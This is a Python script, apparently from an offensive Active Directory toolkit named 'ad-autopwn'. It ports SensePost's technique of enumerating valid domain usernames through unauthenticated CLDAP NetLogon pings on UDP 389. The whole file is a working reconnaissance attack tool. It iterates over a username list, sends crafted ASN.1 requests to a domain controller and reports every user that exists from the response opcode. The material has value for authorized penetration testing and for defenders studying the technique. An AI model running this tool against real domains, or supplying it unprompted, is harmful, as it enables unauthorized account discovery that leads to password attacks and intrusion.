#!/usr/bin/env python3
# userenum-cldap — Domain user enumeration via CLDAP (UDP 389) NetLogon ping.
#
# Sends an unauthenticated CLDAP search whose filter contains a candidate
# username; the DC's NetLogon response opcode reveals whether the user
# exists (LOGON_SAM_USER_UNKNOWN_EX = 0x13 = "no such user" — anything
# else means the user was found).
#
# Technique attribution: Reino Mostert / SensePost, 2018
# (https://github.com/sensepost/userenum). This is a Python 3 port for
# Triop AB's ad-autopwn — string-to-bytes adapted for asn1tools-py3.
#
# Usage:  userenum-cldap <DC-IP> <FQDN-domain> <userlist-file>
# Output: "[+] <user> exists"  for each valid user
#         "[-] error message"  on protocol/socket errors
#         "[*] status"         for run lifecycle

from __future__ import print_function
import socket
import sys

try:
    import asn1tools
except ImportError:
    print("[-] asn1tools not installed (pip install asn1tools)", file=sys.stderr)
    sys.exit(1)

if len(sys.argv) != 4:
    print("Usage: userenum-cldap <DC-IP> <DNS-domain (FQDN)> <userlist>")
    print("Example: userenum-cldap 10.0.0.10 corp.local users.txt")
    sys.exit(2)

# CLDAP NetLogon search request structure (MS-ADTS §6.3.3).
# References:
#   https://msdn.microsoft.com/en-us/library/cc223811.aspx
#   https://github.com/samba-team/samba/blob/master/examples/misc/cldap.pl
SPECIFICATION = '''
Foo DEFINITIONS IMPLICIT TAGS ::= BEGIN
LDAPMessage3 ::= SEQUENCE {
    messageID INTEGER,
    protocolOp [APPLICATION 3] SEQUENCE {
        baseObject OCTET STRING,
        scope ENUMERATED { baseObject(0), singleLevel(1), wholeSubtree(2), ... },
        derefAliases ENUMERATED { neverDerefAliases(0), derefInSearching(1),
                                  derefFindingBaseObj(2), derefAlways(3) },
        sizeLimit INTEGER,
        timeLimit INTEGER,
        typesOnly BOOLEAN,
        filters [0] SEQUENCE {
            filterDomain  [3] SEQUENCE { dnsdomattr OCTET STRING, dnsdomval OCTET STRING },
            filterVersion [3] SEQUENCE { ntverattr  OCTET STRING, ntverval  OCTET STRING },
            filterUser    [3] SEQUENCE { userattr   OCTET STRING, userval   OCTET STRING },
            filterAAC     [3] SEQUENCE { aacattr    OCTET STRING, aacval    OCTET STRING }
        },
        returntype SEQUENCE { netlogon OCTET STRING }
    }
}
END
'''

RESPONSE_SPEC = '''
Bar DEFINITIONS IMPLICIT TAGS ::= BEGIN
LDAPMessage4 ::= SEQUENCE {
    messageID INTEGER,
    protocolOp [APPLICATION 4] SEQUENCE {
        objectName OCTET STRING,
        attributes SEQUENCE {
            partialAttribute SEQUENCE {
                type OCTET STRING,
                vals SET { value OCTET STRING }
            }
        }
    }
}
END
'''

req_asn = asn1tools.compile_string(SPECIFICATION, 'ber')
rsp_asn = asn1tools.compile_string(RESPONSE_SPEC, 'ber')

dc_ip, fqdn, userlist = sys.argv[1], sys.argv[2], sys.argv[3]

with open(userlist) as f:
    users = [line.rstrip() for line in f if line.strip()]

# Static template; we mutate userval per query.
template = {
    'messageID': 0,
    'protocolOp': {
        'baseObject': b'',
        'scope': 'baseObject',
        'derefAliases': 'neverDerefAliases',
        'sizeLimit': 0,
        'timeLimit': 0,
        'typesOnly': False,
        'filters': {
            'filterDomain':  {'dnsdomattr': b'DnsDomain', 'dnsdomval': fqdn.encode()},
            'filterVersion': {'ntverattr':  b'NtVer',     'ntverval':  b'\x03\x00\x00\x00'},
            'filterUser':    {'userattr':   b'User',      'userval':   b''},
            'filterAAC':     {'aacattr':    b'AAC',       'aacval':    b'\x10\x00\x00\x00'},
        },
        'returntype': {'netlogon': b'Netlogon'},
    },
}

total = len(users)
print("[*] Starting CLDAP userenum against {} ({}) — {} candidates"
      .format(dc_ip, fqdn, total), flush=True)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5.0)

# Progress prints every PROGRESS_EVERY users, capped to one print per
# PROGRESS_MIN_INTERVAL seconds so very small runs don't get noisy.
import time as _time
PROGRESS_EVERY = 25
PROGRESS_MIN_INTERVAL = 5.0
last_progress_t = _time.monotonic()

found = 0
for i, user in enumerate(users, 1):
    template['protocolOp']['filters']['filterUser']['userval'] = user.encode()
    encoded = req_asn.encode('LDAPMessage3', template)
    try:
        s.sendto(encoded, (dc_ip, 389))
        data, _ = s.recvfrom(2048)
        decoded = rsp_asn.decode('LDAPMessage4', data)
        nl_blob = decoded['protocolOp']['attributes']['partialAttribute']['vals']['value']
        # value is a bytes blob; first byte is the NETLOGON opcode.
        # 0x13 (19) = LOGON_SAM_USER_UNKNOWN_EX (user does NOT exist).
        # Anything else (commonly 0x17 for found) means the user exists.
        opcode = nl_blob[0] if isinstance(nl_blob, (bytes, bytearray)) and nl_blob else None
        if opcode is not None and opcode != 0x13:
            print("[+] {} exists".format(user), flush=True)
            found += 1
    except asn1tools.codecs.DecodeError:
        print("[-] Decode error (wrong domain FQDN? must be e.g. CORP.LOCAL not CORP)",
              file=sys.stderr, flush=True)
    except (socket.timeout, TimeoutError):
        # No reply within 5s — DC might rate-limit or filter; skip user.
        pass
    except OSError as e:
        print("[-] Socket error: {}".format(e), file=sys.stderr, flush=True)
        break

    # Periodic progress so the operator sees liveness on long runs.
    now = _time.monotonic()
    if i % PROGRESS_EVERY == 0 and (now - last_progress_t) >= PROGRESS_MIN_INTERVAL:
        pct = 100.0 * i / total
        print("[*] progress: {}/{} ({:.1f}%) — {} valid so far"
              .format(i, total, pct, found), file=sys.stderr, flush=True)
        last_progress_t = now

print("[*] Done — {} valid user(s) found".format(found), flush=True)
